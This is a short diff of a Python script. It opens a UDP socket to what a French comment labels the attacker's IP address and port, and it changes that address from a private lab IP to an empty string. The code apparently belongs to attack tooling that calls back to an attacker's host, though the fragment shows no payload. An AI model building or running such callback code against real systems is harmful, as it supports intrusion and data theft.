@@ -28,7 +28,7 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     try:
-        s.connect(("192.168.92.130", 9002))  # Adresse IP et port de l'attaquant
+        s.connect(("", 9002))  # Adresse IP et port de l'attaquant
     except Exception as e:
         print(f"Error connecting: {e}")
         return
